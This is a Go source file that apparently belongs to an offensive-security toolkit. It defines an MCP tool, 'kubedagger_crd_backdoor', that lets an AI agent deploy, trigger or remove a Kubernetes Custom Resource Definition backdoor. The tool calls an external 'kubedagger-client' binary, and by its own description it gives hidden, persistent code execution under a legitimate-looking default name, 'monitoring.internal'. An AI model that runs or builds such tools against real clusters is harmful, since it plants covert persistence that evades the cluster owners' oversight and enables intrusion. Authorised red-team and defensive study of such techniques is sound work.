package kubedagger

import (
	"context"
	"encoding/json"
	"fmt"
	"strings"

	"github.com/yasindce1998/redhands/pkg/executor"
	"github.com/yasindce1998/redhands/pkg/mcp"
)

type CRDBackdoorInput struct {
	Action  string `json:"action,omitempty"`
	CRDName string `json:"crd_name,omitempty"`
}

type CRDBackdoorTool struct {
	exec executor.Executor
}

func NewCRDBackdoor(exec executor.Executor) *CRDBackdoorTool {
	return &CRDBackdoorTool{exec: exec}
}

func (t *CRDBackdoorTool) Name() string { return "kubedagger_crd_backdoor" }

func (t *CRDBackdoorTool) Description() string {
	return "Install a backdoor Custom Resource Definition whose controller provides persistent code execution when custom resources are created or accessed. The CRD appears legitimate but grants a hidden execution path in the cluster."
}

func (t *CRDBackdoorTool) InputSchema() json.RawMessage {
	return json.RawMessage(`{
		"type": "object",
		"properties": {
			"action": {
				"type": "string",
				"enum": ["deploy", "trigger", "remove"],
				"description": "CRD backdoor action (default: deploy)"
			},
			"crd_name": {
				"type": "string",
				"description": "CRD name to use for the backdoor (default: monitoring.internal)"
			}
		}
	}`)
}

func (t *CRDBackdoorTool) Execute(ctx context.Context, params json.RawMessage) (*mcp.ToolResult, error) {
	var input CRDBackdoorInput
	if err := json.Unmarshal(params, &input); err != nil {
		return errorResult("invalid input: " + err.Error()), nil
	}

	if err := validateSafeString(input.CRDName, "crd_name"); err != nil {
		return errorResult(err.Error()), nil
	}

	args := []string{"crd-backdoor"}
	if input.Action != "" {
		args = append(args, "--action", input.Action)
	}
	if input.CRDName != "" {
		args = append(args, "--crd-name", input.CRDName)
	}

	result, err := t.exec.Run(ctx, "kubedagger-client", args...)
	if err != nil {
		stderr := ""
		if result != nil {
			stderr = string(result.Stderr)
		}
		return errorResult(fmt.Sprintf("kubedagger crd-backdoor failed: %s\n%s", err.Error(), stderr)), nil
	}

	output := strings.TrimSpace(string(result.Stdout))
	var sb strings.Builder
	sb.WriteString("## KubeDagger CRD Backdoor\n\n")
	if output == "" {
		sb.WriteString("Operation completed.\n")
	} else {
		sb.WriteString("```\n")
		sb.WriteString(output)
		sb.WriteString("\n```\n")
	}

	return &mcp.ToolResult{
		Content: []mcp.ContentBlock{{Type: "text", Text: sb.String()}},
	}, nil
}
